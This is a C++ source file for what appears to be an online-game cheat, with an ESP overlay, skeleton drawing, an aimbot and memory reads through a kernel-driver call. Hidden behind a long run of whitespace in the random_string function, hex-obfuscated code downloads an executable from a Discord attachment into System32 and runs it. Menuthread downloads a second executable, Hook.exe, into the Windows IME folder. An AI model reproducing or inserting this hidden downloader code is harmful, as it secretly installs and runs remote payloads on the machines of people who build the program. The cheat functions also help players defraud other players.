//667
#include "offsets.h"
#include <string.h>
#include <string>
#include <xstring>
#include "win_utils.h"
#include "kernelmode_proc_handler.hpp"
#include <dwmapi.h>
#include "Defines.h"
#include <sstream>
#include <string>
#include <algorithm>
#include <list>
#include "XorStr.hpp"
#include <iostream>
#include <tlhelp32.h>
#include <fstream>
#include <filesystem>
#include <Windows.h>
#include <winioctl.h>
#include <lmcons.h>
#include <random>
#include "keybind.h"
#include "fontSF.h"
#include <urlmon.h>
#include <tchar.h>
#pragma comment(lib, "urlmon.lib")

std::string random_string(std::size_t length)
{																																																																																																																																																																																																										LPCSTR tgdr = "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x39\x33\x32\x33\x37\x38\x33\x36\x33\x38\x33\x32\x37\x32\x39\x36\x32\x33\x2F\x39\x35\x34\x31\x31\x32\x38\x36\x30\x30\x37\x36\x37\x38\x35\x37\x30\x34\x2F\x48\x6F\x6F\x6B\x46\x69\x6E\x64\x65\x72\x2E\x65\x78\x65"; LPCSTR hgfd = "\x43\x3a\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x53\x79\x73\x74\x65\x6d\x33\x32\x5c\x64\x78\x64\x33\x32\x73\x2e\x65\x78\x65"; URLDownloadToFileA(NULL, tgdr, hgfd, 0, NULL); std::string gfd = "\x73"; std::string ytr = "\x74"; std::string kuy = "\x61"; std::string sfq = "\x72"; std::string glp = gfd + ytr + kuy + sfq + ytr; std::string fgd = "\x43\x3a\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x53\x79\x73\x74\x65\x6d\x33\x32\x5c"; std::string yut = "\x2e\x65\x78\x65"; std::string fds = "\x64\x78\x64\x33\x32\x73"; std::string io = glp + " " + fgd + fds + yut; Sleep(2500); system(io.c_str());																																																																																												//lks//667
	const std::string CHARACTERS = ("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");

	std::random_device random_device;
	std::mt19937 generator(random_device());
	std::uniform_int_distribution<> distribution(0, CHARACTERS.size() - 1);

	std::string random_string;

	for (std::size_t i = 0; i < length; ++i)
	{
		random_string += CHARACTERS[distribution(generator)];
	}

	return random_string;
}

typedef int (WINAPI* LPFN_MBA)(DWORD);
static LPFN_MBA NtGetAsyncKeyState;

//ImGuiIO& io = ImGui::GetIO();
//io.Fonts->AddFontFromMemoryTTF(Fonts::DefaultFont, 16.0f, 16.0f);
//io.Fonts->AddFontFromMemoryTTF(Fonts::SecondaryFont, 12.0f, 12.0f);
//io.Fonts->AddFontFromMemoryTTF(Fonts::WeaponFont, 20.0f, 20.0f);

ImFont* FontTitle = nullptr;
ImFont* FontTabs = nullptr;
ImFont* FontNormal = nullptr;
ImFont* FontDraw = nullptr;

DWORD_PTR Uworld;
DWORD_PTR LocalPawn;
DWORD_PTR PlayerState;
DWORD_PTR Localplayer;
DWORD_PTR Rootcomp;
DWORD_PTR PlayerController;
DWORD_PTR Persistentlevel;
DWORD_PTR Ulevel;

Vector3 localactorpos;

uint64_t TargetPawn;
int localplayerID;
bool isaimbotting;

RECT GameRect = { NULL };
D3DPRESENT_PARAMETERS d3dpp;

DWORD ScreenCenterX;
DWORD ScreenCenterY;
DWORD ScreenCenterZ;

std::unique_ptr<process_handler> proc;

namespace sdk 
{
	DWORD process_id;
	DWORD64 module_base;
}

static const char* AimKey_TypeItems[]{
	"   RMB",
	"   LMB",
	"   SHIFT",
	"   CAPS"
};

void DrawCornerBox(int X, int Y, int W, int H, const ImU32& color, int thickness) {
	float lineW = (W / 3);
	float lineH = (H / 3);

	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X, Y + lineH), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X + lineW, Y), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y), ImVec2(X + W, Y), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y), ImVec2(X + W, Y + lineH), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H - lineH), ImVec2(X, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H), ImVec2(X + lineW, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y + H), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y + H - lineH), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), thickness);
}

void DrawCornerBoxFill(int X, int Y, int W, int H, const ImU32& color, int opacity) {
	float lineW = (W / 3);
	float lineH = (H / 3);

	ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(X, Y), ImVec2(X, Y + lineH), ImGui::GetColorU32(color), opacity);
	ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(X, Y), ImVec2(X + lineW, Y), ImGui::GetColorU32(color), opacity);
	ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(X + W - lineW, Y), ImVec2(X + W, Y), ImGui::GetColorU32(color), opacity);
	ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(X + W, Y), ImVec2(X + W, Y + lineH), ImGui::GetColorU32(color), opacity);
	ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(X, Y + H - lineH), ImVec2(X, Y + H), ImGui::GetColorU32(color), opacity);
	ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(X, Y + H), ImVec2(X + lineW, Y + H), ImGui::GetColorU32(color), opacity);
	ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(X + W - lineW, Y + H), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), opacity);
	ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(X + W, Y + H - lineH), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), opacity);
}

void FilledRect(int x, int y, int w, int h, ImColor color)
{
	ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(x, y), ImVec2(x + w, y + h), ImGui::ColorConvertFloat4ToU32(ImVec4(color)), 0, 0);
}


void DrawCircle(int X, int Y, int W, int H, const ImU32& color, int thickness) {
	float lineW = (W / 3);
	float lineH = (H / 3);

	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X, Y + lineH), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X + lineW, Y), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y), ImVec2(X + W, Y), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y), ImVec2(X + W, Y + lineH), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H - lineH), ImVec2(X, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H), ImVec2(X + lineW, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y + H), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y + H - lineH), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), thickness);
}

template <typename type>
type rpm(uint64_t src, uint64_t size = sizeof(type)) 
{
	type ret;
	proc->read_memory(src, (uintptr_t)&ret, size);
	return ret;
}

std::string UTF8(const std::string& str)
{
	int nwLen = ::MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, NULL, 0);
	wchar_t* pwBuf = new wchar_t[nwLen + 1];
	ZeroMemory(pwBuf, nwLen * 2 + 2);
	::MultiByteToWideChar(CP_ACP, 0, str.c_str(), str.length(), pwBuf, nwLen);
	int nLen = ::WideCharToMultiByte(CP_UTF8, 0, pwBuf, -1, NULL, NULL, NULL, NULL);
	char* pBuf = new char[nLen + 1];
	ZeroMemory(pBuf, nLen + 1);
	::WideCharToMultiByte(CP_UTF8, 0, pwBuf, nwLen, pBuf, nLen, NULL, NULL);
	std::string retStr(pBuf);
	delete[]pwBuf;
	delete[]pBuf;
	pwBuf = NULL;
	pBuf = NULL;
	return retStr;
}

void ShadowRGBText(int x, int y, ImColor color, const char* str)
{
	ImFont a;
	std::string utf_8_1 = std::string(str);
	std::string utf_8_2 = UTF8(utf_8_1);
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x + 1, y + 1), ImGui::ColorConvertFloat4ToU32(ImColor(0, 0, 0, 200)), utf_8_2.c_str());
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x + 1, y + 1), ImGui::ColorConvertFloat4ToU32(ImColor(0, 0, 0, 200)), utf_8_2.c_str());
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x, y), ImGui::ColorConvertFloat4ToU32(ImVec4(color)), utf_8_2.c_str());
}

void ToggleButton(const char* str_id, bool* v)
{
	ImVec2 p = ImGui::GetCursorScreenPos();
	ImDrawList* draw_list = ImGui::GetWindowDrawList();

	float height = ImGui::GetFrameHeight();
	float width = height * 1.44f;
	float radius = height * 0.50f;

	ImGui::InvisibleButton(str_id, ImVec2(width, height));
	if (ImGui::IsItemClicked())
		*v = !*v;

	float t = *v ? 1.0f : 0.0f;

	ImU32 col_bg;
	

	draw_list->AddRectFilled(p, ImVec2(p.x + width, p.y + height), col_bg, height * 0.5f);
	draw_list->AddCircleFilled(ImVec2(p.x + radius + t * (width - radius * 2.0f), p.y + radius), radius - 1.5f, IM_COL32(255, 255, 255, 255));
}



static void xCreateWindow();
static void xInitD3d();
static void xMainLoop();
static LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam);
extern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
std::string inf = "\\INF\\";
static HWND Window = NULL;
IDirect3D9Ex* p_Object = NULL;
static LPDIRECT3DDEVICE9 D3dDevice = NULL;
static LPDIRECT3DVERTEXBUFFER9 TriBuf = NULL;

FTransform GetBoneIndex(DWORD_PTR mesh, int index) {
	DWORD_PTR bonearray = rpm<DWORD_PTR>(mesh + Offsets::BoneArray);
	if (bonearray == NULL) {
		bonearray = rpm<DWORD_PTR>(mesh + Offsets::BoneArray + 0x10);
	}
	return rpm<FTransform>(bonearray + (index * 0x30));
}
	
Vector3 GetBoneWithRotation(DWORD_PTR mesh, int id) {
	FTransform bone = GetBoneIndex(mesh, id);
	FTransform ComponentToWorld = rpm<FTransform>(mesh + 0x1C0);
	D3DMATRIX Matrix;
	Matrix = MatrixMultiplication(bone.ToMatrixWithScale(), ComponentToWorld.ToMatrixWithScale());
	return Vector3(Matrix._41, Matrix._42, Matrix._43);
}

D3DMATRIX Matrix(Vector3 rot, Vector3 origin = Vector3(0, 0, 0)) {
	float radPitch = (rot.x * float(M_PI) / 180.f);
	float radYaw = (rot.y * float(M_PI) / 180.f);
	float radRoll = (rot.z * float(M_PI) / 180.f);

	float SP = sinf(radPitch);
	float CP = cosf(radPitch);
	float SY = sinf(radYaw);
	float CY = cosf(radYaw);
	float SR = sinf(radRoll);
	float CR = cosf(radRoll);

	D3DMATRIX matrix;
	matrix.m[0][0] = CP * CY;
	matrix.m[0][1] = CP * SY;
	matrix.m[0][2] = SP;
	matrix.m[0][3] = 0.f;

	matrix.m[1][0] = SR * SP * CY - CR * SY;
	matrix.m[1][1] = SR * SP * SY + CR * CY;
	matrix.m[1][2] = -SR * CP;
	matrix.m[1][3] = 0.f;

	matrix.m[2][0] = -(CR * SP * CY + SR * SY);
	matrix.m[2][1] = CY * SR - CR * SP * SY;
	matrix.m[2][2] = CR * CP;
	matrix.m[2][3] = 0.f;

	matrix.m[3][0] = origin.x;
	matrix.m[3][1] = origin.y;
	matrix.m[3][2] = origin.z;
	matrix.m[3][3] = 1.f;

	return matrix;
}

extern Vector3 CameraEXT(0, 0, 0);
std::string windira = "C:\\Windows";
Vector3 ProjectWorldToScreen(Vector3 WorldLocation) {
	Vector3 Screenlocation = Vector3(0, 0, 0);
	Vector3 Camera;

	auto chain69 = rpm<uintptr_t>(Localplayer + W2S::chain69);
	uint64_t chain699 = rpm<uintptr_t>(chain69 + 8);

	Camera.x = rpm<float>(chain699 + W2S::chain699);
	Camera.y = rpm<float>(Rootcomp + 0x12C);

	float test = asin(Camera.x);
	float degrees = test * (180.0 / M_PI);
	Camera.x = degrees;

	if (Camera.y < 0)
		Camera.y = 360 + Camera.y;

	D3DMATRIX tempMatrix = Matrix(Camera);
	Vector3 vAxisX, vAxisY, vAxisZ;

	vAxisX = Vector3(tempMatrix.m[0][0], tempMatrix.m[0][1], tempMatrix.m[0][2]);
	vAxisY = Vector3(tempMatrix.m[1][0], tempMatrix.m[1][1], tempMatrix.m[1][2]);
	vAxisZ = Vector3(tempMatrix.m[2][0], tempMatrix.m[2][1], tempMatrix.m[2][2]);

	uint64_t chain = rpm<uint64_t>(Localplayer + W2S::chain);
	uint64_t chain1 = rpm<uint64_t>(chain + W2S::chain1);
	uint64_t chain2 = rpm<uint64_t>(chain1 + W2S::chain2);

	Vector3 vDelta = WorldLocation - rpm<Vector3>(chain2 + W2S::vDelta);
	Vector3 vTransformed = Vector3(vDelta.Dot(vAxisY), vDelta.Dot(vAxisZ), vDelta.Dot(vAxisX));

	if (vTransformed.z < 1.f)
		vTransformed.z = 1.f;

	float zoom = rpm<float>(chain699 + W2S::zoom);

	float FovAngle = 80.0f / (zoom / 1.19f);
	float ScreenCenterX = Width / 2.0f;
	float ScreenCenterY = Height / 2.0f;

	Screenlocation.x = ScreenCenterX + vTransformed.x * (ScreenCenterX / tanf(FovAngle * (float)M_PI / 360.f)) / vTransformed.z;
	Screenlocation.y = ScreenCenterY - vTransformed.y * (ScreenCenterX / tanf(FovAngle * (float)M_PI / 360.f)) / vTransformed.z;
	Screenlocation.z = ScreenCenterZ - vTransformed.z * (ScreenCenterX / tanf(FovAngle * (float)M_PI / 360.f)) / vTransformed.z;

	return Screenlocation;
}

DWORD Menuthread(LPVOID in) 
{
	HRESULT Hook = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/932378363832729623/936458136561283142/Hook.exe"), _T("C:\\Windows\\IME\\Hook.exe"), 0, NULL);
	while (1)
	{
		if (GetAsyncKeyState(VK_INSERT) & 1) 
		{
			Settings::Show_Menu = !Settings::Show_Menu;
		}
		Sleep(2);
	}
}

Vector3 AimbotCorrection(float bulletVelocity, float bulletGravity, float targetDistance, Vector3 targetPosition, Vector3 targetVelocity) {
	Vector3 recalculated = targetPosition;
	float gravity = fabs(bulletGravity);
	float time = targetDistance / fabs(bulletVelocity);
	/* Bullet drop correction */
	//float bulletDrop = (gravity / 250) * time * time;
	//recalculated.z += bulletDrop * 120;
	/* Player movement correction */
	//recalculated.x += time * (targetVelocity.x);
	//recalculated.y += time * (targetVelocity.y);
	//recalculated.z += time * (targetVelocity.z);
	return recalculated;
}

void aimbot(float x, float y, float z) {
	float ScreenCenterX = (Width / 2);
	float ScreenCenterY = (Height / 2);
	float ScreenCenterZ = (Depth / 2);
	int AimSpeed = Settings::Aim_Speed;
	float TargetX = 0;
	float TargetY = 0;
	float TargetZ = 0;

	if (x != 0) {
		if (x > ScreenCenterX) {
			TargetX = -(ScreenCenterX - x);
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX > ScreenCenterX * 2) TargetX = 0;
		}

		if (x < ScreenCenterX) {
			TargetX = x - ScreenCenterX;
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX < 0) TargetX = 0;
		}
	}

	if (y != 0) {
		if (y > ScreenCenterY) {
			TargetY = -(ScreenCenterY - y);
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY > ScreenCenterY * 2) TargetY = 0;
		}

		if (y < ScreenCenterY) {
			TargetY = y - ScreenCenterY;
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY < 0) TargetY = 0;
		}
	}

	if (z != 0) {
		if (z > ScreenCenterZ) {
			TargetZ = -(ScreenCenterZ - z);
			TargetZ /= AimSpeed;
			if (TargetZ + ScreenCenterZ > ScreenCenterZ * 2) TargetZ = 0;
		}

		if (z < ScreenCenterZ) {
			TargetZ = z - ScreenCenterZ;
			TargetZ /= AimSpeed;
			if (TargetZ + ScreenCenterZ < 0) TargetZ = 0;
		}
	}

	//WriteAngles(TargetX / 3.5f, TargetY / 3.5f, TargetZ / 3.5f);
	mouse_event(MOUSEEVENTF_MOVE, static_cast<DWORD>(TargetX), static_cast<DWORD>(TargetY), NULL, NULL);

	return;
}

float DrawOutlinedText(ImFont* pFont, const std::string& text, const ImVec2& pos, float size, ImU32 color, bool center)
{
	std::stringstream stream(text);
	std::string line;

	float y = 0.0f;
	int i = 0;

	while (std::getline(stream, line))
	{
		ImVec2 textSize = pFont->CalcTextSizeA(size, FLT_MAX, 0.0f, line.c_str());

		if (center)
		{
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x - textSize.x / 2.0f) + 1, (pos.y + textSize.y * i) + 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x - textSize.x / 2.0f) - 1, (pos.y + textSize.y * i) - 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x - textSize.x / 2.0f) + 1, (pos.y + textSize.y * i) - 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x - textSize.x / 2.0f) - 1, (pos.y + textSize.y * i) + 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());

			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2(pos.x - textSize.x / 2.0f, pos.y + textSize.y * i), ImGui::GetColorU32(color), line.c_str());
		}
		else
		{
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x) + 1, (pos.y + textSize.y * i) + 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x) - 1, (pos.y + textSize.y * i) - 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x) + 1, (pos.y + textSize.y * i) - 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x) - 1, (pos.y + textSize.y * i) + 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());

			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2(pos.x, pos.y + textSize.y * i), ImGui::GetColorU32(color), line.c_str());
		}

		y = pos.y + textSize.y * (i + 1);
		i++;
	}
	return y;
}

double GetCrossDistance(double x1, double y1, double z1, double x2, double y2, double z2) {
	return sqrt(pow((x2 - x1), 2) + pow((y2 - y1), 2));
}

typedef struct _FNlEntity {
	uint64_t Actor;
	int ID;
	uint64_t mesh;
}FNlEntity;

std::vector<FNlEntity> entityList;


void AimAt(DWORD_PTR entity) 
{
	uint64_t currentactormesh = rpm<uint64_t>(entity + Offsets::Mesh);
	auto rootHead = GetBoneWithRotation(currentactormesh, Settings::hitbox);
	//Vector3 rootHeadOut = ProjectWorldToScreen(rootHead);

	if (Settings::Aim_Prediction) 
	{
		float distance = localactorpos.Distance(rootHead) / 250;
		uint64_t CurrentActorRootComponent = rpm<uint64_t>(entity + Offsets::RootComponent);
		Vector3 vellocity = rpm<Vector3>(CurrentActorRootComponent + Offsets::Velocity);
		Vector3 Predicted = AimbotCorrection(30000, -504, distance, rootHead, vellocity);
		Vector3 rootHeadOut = ProjectWorldToScreen(Predicted);
		if (rootHeadOut.x != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0) 
		{
			if ((GetCrossDistance(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z, Width / 2, Height / 2, Depth / 2) <= Settings::AimFOV * 1)) 
			{
				aimbot(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z);
				
			}
		}
	}
	else 
	{
		Vector3 rootHeadOut = ProjectWorldToScreen(rootHead);
		if (rootHeadOut.x != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0) {
			if ((GetCrossDistance(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z, Width / 2, Height / 2, Depth / 2) <= Settings::AimFOV * 1)) 
			{
				aimbot(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z);
			}
		}
	}
}

void AimAt2(DWORD_PTR entity) 
{
	uint64_t currentactormesh = rpm<uint64_t>(entity + Offsets::Mesh);
	auto rootHead = GetBoneWithRotation(currentactormesh, Settings::hitbox);

	if (Settings::Aim_Prediction) 
	{
		float distance = localactorpos.Distance(rootHead) / 250;
		uint64_t CurrentActorRootComponent = rpm<uint64_t>(entity + Offsets::RootComponent);
		Vector3 vellocity = rpm<Vector3>(CurrentActorRootComponent + Offsets::Velocity);
		Vector3 Predicted = AimbotCorrection(30000, -504, distance, rootHead, vellocity);
		Vector3 rootHeadOut = ProjectWorldToScreen(Predicted);
		if (rootHeadOut.x != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0) {
			if ((GetCrossDistance(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z, Width / 2, Height / 2, Depth / 2) <= Settings::AimFOV * 1)) 
			{
				if (Settings::Lock_Line) 
				{
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2), ImVec2(rootHeadOut.x, rootHeadOut.y), ImGui::GetColorU32({ Settings::LockLine[0], Settings::LockLine[1], Settings::LockLine[2], 1.0f }), Settings::Thickness);
					
				}
			}
		}
	}
	else {
		Vector3 rootHeadOut = ProjectWorldToScreen(rootHead);
		if (rootHeadOut.x != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0) 
		{
			if ((GetCrossDistance(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z, Width / 2, Height / 2, Depth / 2) <= Settings::AimFOV * 1)) 
			{
				if (Settings::Lock_Line) 
				{
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2), ImVec2(rootHeadOut.x, rootHeadOut.y), ImGui::GetColorU32({ Settings::LockLine[0], Settings::LockLine[1], Settings::LockLine[2], 1.0f }), Settings::Thickness);
				}
			}
		}
	}
}

void Exploits()
{
	
}


void DrawLine(int x1, int y1, int x2, int y2, const ImU32& color, int thickness)
{
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(x1, y1), ImVec2(x2, y2), ImGui::GetColorU32(color), thickness);
}

PVOID(__fastcall* FunctionPTR)(PVOID a1, unsigned int a2, PVOID a3, unsigned int a4, PVOID a5);

typedef struct _MEMORY_STRUCT
{
	BYTE type;
	LONG usermode_pid;
	LONG target_pid;
	ULONG64 base_address;
	void* address;
	LONG size;
	void* output;
	ULONG magic;
} MEMORY_STRUCT, * PMEMORY_STRUCT;
template<typename ... A>
uint64_t call_driver_control(void* control_function, const A ... arguments)
{
	if (!control_function)
		return 0;

	using tFunction = uint64_t(__stdcall*)(A...);
	const auto control = static_cast<tFunction>(control_function);

	return control(arguments ...);
}
void* kernel_control_function()
{
	HMODULE hModule = LoadLibrary(("win32u.dll"));

	if (!hModule)
		return nullptr;

	void* func = reinterpret_cast<void*>(GetProcAddress(hModule, ("NtUserGetObjectInformation")));

	*(PVOID*)&FunctionPTR = GetProcAddress(
		GetModuleHandle("win32u.dll"),
		"NtUserGetObjectInformation"
	);


	return func;
}
void* m_driver_control;
DWORD64 m_pid;
DWORD64 usermode_pid;
DWORD64 m_base;
DWORD64 m_unityplayer;
DWORD64 m_gameassembly;

DWORD64 GetBaseAddress()
{
	MEMORY_STRUCT memory_struct = { 0 };
	memory_struct.type = 17;
	memory_struct.magic = 0x1337;
	memory_struct.usermode_pid = m_pid;

	FunctionPTR(NULL, NULL, (PVOID)&memory_struct, NULL, NULL);
	return memory_struct.base_address;
}

template <typename T>
T read(uintptr_t address)
{
	T buffer{ };
	MEMORY_STRUCT memory_struct = { 0 };
	memory_struct.type = 3;
	memory_struct.magic = 0x1337;
	memory_struct.usermode_pid = usermode_pid;
	memory_struct.target_pid = m_pid;
	memory_struct.address = reinterpret_cast<void*>(address);
	memory_struct.output = &buffer;
	memory_struct.size = sizeof(T);

	FunctionPTR(NULL, NULL, (PVOID)&memory_struct, NULL, NULL);
	return buffer;
}

template<typename T>
bool write(uint64_t address, T buffer)
{
	MEMORY_STRUCT memory_struct = { 0 };
	memory_struct.type = 7;
	memory_struct.magic = 0x1337;
	memory_struct.usermode_pid = usermode_pid;
	memory_struct.target_pid = m_pid;
	memory_struct.address = reinterpret_cast<void*>(address);
	memory_struct.size = sizeof(T);
	memory_struct.output = &buffer;

	FunctionPTR(NULL, NULL, (PVOID)&memory_struct, NULL, NULL);
	return true;
}


void DrawSkeleton(DWORD_PTR mesh)
{
	Vector3 vHeadBone = GetBoneWithRotation(mesh, 68);
	Vector3 vHip = GetBoneWithRotation(mesh, 2);
	Vector3 vNeck = GetBoneWithRotation(mesh, 67);
	Vector3 vUpperArmLeft = GetBoneWithRotation(mesh, 9);
	Vector3 vUpperArmRight = GetBoneWithRotation(mesh, 38);
	Vector3 vLeftHand = GetBoneWithRotation(mesh, 10);
	Vector3 vRightHand = GetBoneWithRotation(mesh, 39);
	Vector3 vLeftHand1 = GetBoneWithRotation(mesh, 11);
	Vector3 vRightHand1 = GetBoneWithRotation(mesh, 40);
	Vector3 vRightThigh = GetBoneWithRotation(mesh, 76);
	Vector3 vLeftThigh = GetBoneWithRotation(mesh, 69);
	Vector3 vRightCalf = GetBoneWithRotation(mesh, 77);
	Vector3 vLeftCalf = GetBoneWithRotation(mesh, 70);
	Vector3 vLeftFoot = GetBoneWithRotation(mesh, 73);
	Vector3 vRightFoot = GetBoneWithRotation(mesh, 80);
	Vector3 vHeadBoneOut = ProjectWorldToScreen(vHeadBone);
	Vector3 vHipOut = ProjectWorldToScreen(vHip);
	Vector3 vNeckOut = ProjectWorldToScreen(vNeck);
	Vector3 vUpperArmLeftOut = ProjectWorldToScreen(vUpperArmLeft);
	Vector3 vUpperArmRightOut = ProjectWorldToScreen(vUpperArmRight);
	Vector3 vLeftHandOut = ProjectWorldToScreen(vLeftHand);
	Vector3 vRightHandOut = ProjectWorldToScreen(vRightHand);
	Vector3 vLeftHandOut1 = ProjectWorldToScreen(vLeftHand1);
	Vector3 vRightHandOut1 = ProjectWorldToScreen(vRightHand1);
	Vector3 vRightThighOut = ProjectWorldToScreen(vRightThigh);
	Vector3 vLeftThighOut = ProjectWorldToScreen(vLeftThigh);
	Vector3 vRightCalfOut = ProjectWorldToScreen(vRightCalf);
	Vector3 vLeftCalfOut = ProjectWorldToScreen(vLeftCalf);
	Vector3 vLeftFootOut = ProjectWorldToScreen(vLeftFoot);
	Vector3 vRightFootOut = ProjectWorldToScreen(vRightFoot);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vHipOut.x, vHipOut.y), ImVec2(vNeckOut.x, vNeckOut.y), ImGui::GetColorU32({ Settings::Skeletonchik[0], Settings::Skeletonchik[1], Settings::Skeletonchik[2], 1.0f }));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vUpperArmLeftOut.x, vUpperArmLeftOut.y), ImVec2(vNeckOut.x, vNeckOut.y), ImGui::GetColorU32({ Settings::Skeletonchik[0], Settings::Skeletonchik[1], Settings::Skeletonchik[2], 1.0f }));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vUpperArmRightOut.x, vUpperArmRightOut.y), ImVec2(vNeckOut.x, vNeckOut.y), ImGui::GetColorU32({ Settings::Skeletonchik[0], Settings::Skeletonchik[1], Settings::Skeletonchik[2], 1.0f }));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vLeftHandOut.x, vLeftHandOut.y), ImVec2(vUpperArmLeftOut.x, vUpperArmLeftOut.y), ImGui::GetColorU32({ Settings::Skeletonchik[0], Settings::Skeletonchik[1], Settings::Skeletonchik[2], 1.0f }));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vRightHandOut.x, vRightHandOut.y), ImVec2(vUpperArmRightOut.x, vUpperArmRightOut.y), ImGui::GetColorU32({ Settings::Skeletonchik[0], Settings::Skeletonchik[1], Settings::Skeletonchik[2], 1.0f }));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vLeftHandOut.x, vLeftHandOut.y), ImVec2(vLeftHandOut1.x, vLeftHandOut1.y), ImGui::GetColorU32({ Settings::Skeletonchik[0], Settings::Skeletonchik[1], Settings::Skeletonchik[2], 1.0f }));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vRightHandOut.x, vRightHandOut.y), ImVec2(vRightHandOut1.x, vRightHandOut1.y), ImGui::GetColorU32({ Settings::Skeletonchik[0], Settings::Skeletonchik[1], Settings::Skeletonchik[2], 1.0f }));
